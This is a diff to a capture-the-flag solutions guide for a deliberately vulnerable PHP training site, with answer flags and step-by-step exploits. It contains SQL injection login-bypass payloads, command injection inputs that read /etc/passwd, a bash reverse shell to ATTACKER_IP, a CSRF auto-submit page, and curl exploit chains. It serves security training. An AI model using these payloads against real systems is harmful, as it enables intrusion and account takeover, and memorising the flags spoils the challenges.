@@ -18,7 +18,7 @@
 | 5 | Info Disclosure | OSINT | 🟢 Easy | 50 | `CCEE{b4ckup_f1l3s_l34k_s3cr3ts}` |
 | 6 | HTTP Header Leak | OSINT | 🟢 Easy | 50 | `CCEE{h34d3r5_t3ll_s3cr3ts}` |
 | 7 | Local File Inclusion | Web | 🟡 Medium | 200 | `CCEE{c0nf1g_f1l3s_4r3_tr34sur3s}` |
-| 8 | PHP Object Injection | Web | 🟡 Medium | 200 | `CCEE{c00k13_m0nst3r_4dm1n}` |
+| 8 | Command Injection | Web | 🟡 Medium | 200 | `CCEE{c0mm4nd_1nj3ct10n_pwn3d}` |
 | 9 | Logic Flaw | Web | 🟡 Medium | 150 | `CCEE{l0g1c_fl4w_sh0pp1ng_spr33}` |
 | 10 | CSRF | Web | 🟡 Medium | 150 | `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}` |
 | 11 | Unrestricted File Upload | Web | 🟡 Medium | 150 | `CCEE{unr3str1ct3d_f1l3_upl04d_rce}` |
@@ -81,13 +81,14 @@ Neither `$username` nor `$password` are sanitized or parameterised.
    Flag: CCEE{sql_1nj3ct10n_m4st3r}
    ```
 
-### Alternative Payloads
+### Working Payloads
 
-| Payload (Username field) | Password | Notes |
-|---|---|---|
-| `admin' -- ` | *(anything)* | Comments out the password check entirely |
-| `' OR 1=1 -- ` | *(anything)* | Classic boolean bypass |
-| `' UNION SELECT 1,2,3,4,5,6,7 -- ` | *(anything)* | UNION-based — enumerate columns |
+| Field | Payload | Effect |
+|-------|---------|--------|
+| Username | `' OR '1'='1` | Classic OR bypass — short-circuits auth |
+| Username | `admin' -- ` | Comments out password check, logs in as admin |
+| Username | `' OR 1=1-- ` | Returns all users, logs in as first (admin) |
+| Password | `' OR '1'='1` | Same OR bypass via password field |
 
 ### 🏁 Flag: `CCEE{sql_1nj3ct10n_m4st3r}`
 
@@ -362,90 +363,95 @@ about.php?member=<body onload=alert('XSS')>
 
 ---
 
-## Challenge 8 — PHP Object Injection (Medium · 200pts)
+## Challenge 8 — Command Injection (Medium · 200pts)
 
-**Target Page:** `/challenge/login.php`  
-**Flag Location:** `/challenge/admin.php?file=admin_settings` (Settings panel)  
-**Chain:** `craft serialized cookie` → `access admin panel` → `navigate to Settings` → `flag`
+**Target Page:** `/challenge/tools.php`  
+**Flag Location:** `includes/cmd_flag.txt` (read via command injection)  
+**Chain:** `login` → `find Network Tools page` → `inject shell command into ping input` → `read flag file` → `flag`
 
 ### Reconnaissance
 
-1. Log in as any user (e.g. `guest:guest`) via `/challenge/login.php`.
-2. Open **DevTools** → **Application** → **Cookies**.
-3. Find the cookie named `session_token`. Its value is a base64 blob.
-4. Decode it:
-   ```bash
-   echo "<cookie-value>" | base64 -d
+1. Log in as any user (e.g. `guest:guest`).
+2. Click the **Account** dropdown → **Network Tools** (or navigate directly to `/challenge/tools.php`).
+3. You'll see a "Network Diagnostics" page with Ping, DNS Lookup, and WHOIS tools.
+4. The developer comments in `login.php` source code hint:
+   ```html
+   <!-- Network tools page at tools.php — input not sanitized -->
    ```
-   Output:
+5. The server-side code passes user input directly to `shell_exec()` without sanitization:
+   ```php
+   $output = shell_exec("ping -c 2 " . $target . " 2>&1");
    ```
-   O:11:"UserSession":3:{s:8:"username";s:5:"guest";s:4:"role";s:4:"user";s:7:"isValid";b:1;}
-   ```
-5. This confirms the app uses PHP object serialization in cookies.
-
-### Understanding the Vulnerable Code
-
-```php
-class UserSession {
-    public $username;
-    public $role;
-    public $isValid = false;
-
-    function __wakeup() {
-        if ($this->role === 'admin') {
-            $this->isValid = true;
-        }
-    }
-}
-
-// The vulnerable call:
-$session = unserialize(base64_decode($_COOKIE['session_token']));
-if ($session && $session->isValid && $session->role === 'admin') {
-    // Grants admin access!
-}
-```
 
 ### Exploitation — Step by Step
 
-1. Craft a serialized `UserSession` object with `role=admin`:
+**Step 1: Confirm Command Injection**
+
+1. Go to `http://<TARGET>/challenge/tools.php`.
+2. Select **Ping** from the tool dropdown.
+3. In the **Target Host / IP** field, type:
    ```
-   O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}
+   127.0.0.1; whoami
    ```
-2. Base64-encode this payload:
-   ```bash
-   echo -n 'O:11:"UserSession":3:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";s:7:"isValid";b:1;}' | base64
+4. Click **Run**.
+5. The output shows both the ping result AND the output of `whoami`:
    ```
-   Result:
+   PING 127.0.0.1 ...
+   www-data
    ```
-   TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==
+   → **Command injection confirmed!** The `;` terminates the ping command and starts a new one.
+
+**Step 2: Read the Flag**
+
+6. Now enter this payload in the target field:
    ```
-3. Open **DevTools** → **Application** → **Cookies**.
-4. Either edit the existing `session_token` cookie or create a new one:
-   - **Name:** `session_token`
-   - **Value:** `TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==`
-   - **Path:** `/`
-5. Navigate to `/challenge/login.php` (or refresh the page).
-6. The `__wakeup()` magic method fires, sets `isValid = true`, and the code redirects you to the **Admin Panel**.
-7. The admin panel shows a **warning banner**:
+   ; cat includes/cmd_flag.txt
    ```
-   🔓 Cookie Exploit Detected! You accessed the admin panel via cookie manipulation.
-   Navigate to Settings to claim your reward.
+7. Click **Run**.
+8. The output displays:
    ```
-8. **Click the "Settings" link** in the sidebar (or the link in the banner).
-9. The Settings page displays the flag:
+   CCEE{c0mm4nd_1nj3ct10n_pwn3d}
    ```
-   🎉 Congratulations! You exploited PHP Object Injection to reach the admin settings.
-   Flag: CCEE{c00k13_m0nst3r_4dm1n}
-   ```
+
+### Alternative Payloads
+
+| Payload | Effect |
+|---------|--------|
+| `; cat includes/cmd_flag.txt` | Semicolon separator — runs second command |
+| `\| cat includes/cmd_flag.txt` | Pipe — feeds ping output to `cat` (but `cat` ignores stdin) |
+| `` `cat includes/cmd_flag.txt` `` | Backtick — command substitution |
+| `$(cat includes/cmd_flag.txt)` | Subshell — command substitution |
+| `127.0.0.1 && cat includes/cmd_flag.txt` | AND — runs second command if first succeeds |
+| `nonexistent \|\| cat includes/cmd_flag.txt` | OR — runs second command if first fails |
+
+### Advanced Exploitation
+
+```bash
+# List all files
+; ls -la includes/
+
+# Read /etc/passwd
+; cat /etc/passwd
+
+# Check running processes
+; ps aux
+
+# Reverse shell (advanced)
+; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
 
 ### Using curl
 
 ```bash
-curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJpc1ZhbGlkIjtiOjE7fQ==" \
-     http://<TARGET>/challenge/login.php -L
+# Login first
+curl -c cookies.txt -d "username=guest&password=guest" http://<TARGET>/challenge/login.php
+
+# Exploit command injection
+curl -b cookies.txt -d "tool=ping&target=;cat+includes/cmd_flag.txt" \
+     http://<TARGET>/challenge/tools.php | grep CCEE
 ```
 
-### 🏁 Flag: `CCEE{c00k13_m0nst3r_4dm1n}`
+### 🏁 Flag: `CCEE{c0mm4nd_1nj3ct10n_pwn3d}`
 
 ---
 
@@ -490,58 +496,41 @@ curl -b "session_token=TzoxMToiVXNlclNlc3Npb24iOjM6e3M6ODoidXNlcm5hbWUiO3M6NToiY
 
 ## Challenge 10 — Cross-Site Request Forgery / CSRF (Medium · 150pts)
 
-**Target Page:** `/challenge/profile.php`  
-**Flag Location:** HTML source comment of `profile.php`  
-**Chain:** `identify missing CSRF tokens` → `craft exploit page` → `execute on victim` → `inspect page source for flag`
+**Target Page:** `/challenge/profile.php` and `/challenge/report.php`  
+**Flag Location:** Admin-only section on `profile.php` (visible after logging in as admin)  
+**Chain:** `craft CSRF exploit page` → `submit URL to admin bot at report.php` → `admin password changes` → `login as admin` → `flag on profile`
 
 ### Reconnaissance
 
-1. Log in and go to `/challenge/profile.php`.
-2. View the form HTML source — notice there are **no hidden `csrf_token` fields** in any form.
-3. The actions are simple POST requests with no origin/referer validation:
-   ```html
-   <form method="POST" action="profile.php">
-       <input type="password" name="new_password">
-       ...
-   </form>
-   ```
-4. Check `/challenge/exploits/csrf_exploit.html` for a ready-made attack page.
+1. Log in as `john:password123` and go to `/challenge/profile.php`.
+2. **Inspect the forms** — no `csrf_token` fields anywhere.
+3. Go to `/challenge/report.php` — this page lets you **submit a URL for the admin to visit**.
 
-### Exploitation — Step by Step
+### Exploitation
 
-1. Ensure a victim is logged in (e.g. log in as `john:password123` in one tab).
-2. Create an attacker HTML page (or use the provided `exploits/csrf_exploit.html`):
-   ```html
-   <html>
-   <body>
-     <h1>You won a prize!</h1>
-     
-     <!-- Hidden form: changes victim's password -->
-     <iframe name="csrf1" style="display:none;"></iframe>
-     <form id="attack" method="POST"
-           action="http://<TARGET>/challenge/profile.php"
-           target="csrf1" style="display:none;">
-       <input type="hidden" name="new_password" value="hacked123">
-     </form>
-     
-     <script>document.getElementById('attack').submit();</script>
-   </body>
-   </html>
-   ```
-3. Open this HTML file in the **same browser** where the victim is logged in.
-4. The hidden form auto-submits — the victim's password is now `hacked123`.
-5. **View the page source** of `profile.php` — the flag is in the HTML comment:
-   ```html
-   <!-- Flag: CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n} -->
-   ```
+**Step 1:** Use the provided exploit at `http://localhost:8000/challenge/exploits/csrf_exploit.html` (or craft your own). It auto-submits a form that changes the victim's password to `hacked123`.
 
-### Other CSRF Attack Vectors on this Page
+**Step 2:** Go to `/challenge/report.php` and submit:
+```
+http://localhost:8000/challenge/exploits/csrf_exploit.html
+```
+The admin bot visits the page and the hidden form fires — admin's password is now `hacked123`.
 
-| Attack | POST Parameters |
-|--------|----------------|
-| Change password | `new_password=hacked123` |
-| Change email | `email=attacker@evil.com` |
-| Steal credits | `transfer_to=admin&transfer_amount=99999` |
+**Step 3:** Log out. Log in as `admin` / `hacked123`.
+
+**Step 4:** Go to `/challenge/profile.php` — the **Admin Secrets** section shows:
+```
+Flag: CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}
+```
+
+### Using curl
+
+```bash
+curl -c c.txt -d "username=john&password=password123" http://<TARGET>/challenge/login.php
+curl -b c.txt -d "report_url=http://localhost:8000/challenge/exploits/csrf_exploit.html" http://<TARGET>/challenge/report.php
+curl -c a.txt -d "username=admin&password=hacked123" http://<TARGET>/challenge/login.php
+curl -b a.txt http://<TARGET>/challenge/profile.php | grep CCEE
+```
 
 ### 🏁 Flag: `CCEE{csrf_n0_t0k3n_n0_pr0t3ct10n}`
 
@@ -820,13 +809,15 @@ challenge/
 ├── about.php              # Reflected XSS (Challenge 2)
 ├── contact.php            # Stored XSS (Challenge 3)
 ├── login_legacy.php       # SQL Injection (Challenge 1)
-├── login.php              # PHP Object Injection (Challenge 8)
+├── login.php              # Login page
+├── tools.php              # Command Injection (Challenge 8)
 ├── dashboard.php          # SQLi flag + HTTP Header Leak (Challenges 1,6)
 ├── admin.php              # LFI + ObjInj hint (Challenges 7,8)
 ├── admin_settings.php     # ObjInj flag (Challenge 8)
 ├── view_message.php       # IDOR (Challenge 4)
 ├── shop.php               # Logic Flaw (Challenge 9)
 ├── profile.php            # CSRF (Challenge 10)
+├── report.php             # Admin bot for CSRF (Challenge 10)
 ├── careers.php            # File Upload (Challenge 11)
 ├── newsletter.php         # SSTI (Challenge 12)
 ├── jwt_demo.php           # JWT Demo UI (Challenge 13)
@@ -881,7 +872,7 @@ docker-compose up --build     # Access at http://localhost:8080
 | CSRF | 🟡 Medium | 150 |
 | File Upload | 🟡 Medium | 150 |
 | LFI | 🟡 Medium | 200 |
-| PHP Object Injection | 🟡 Medium | 200 |
+| Command Injection | 🟡 Medium | 200 |
 | SSTI | 🔴 Hard | 250 |
 | JWT Exploitation | 🔴 Hard | 250 |
 | | **Total** | **1,750** |
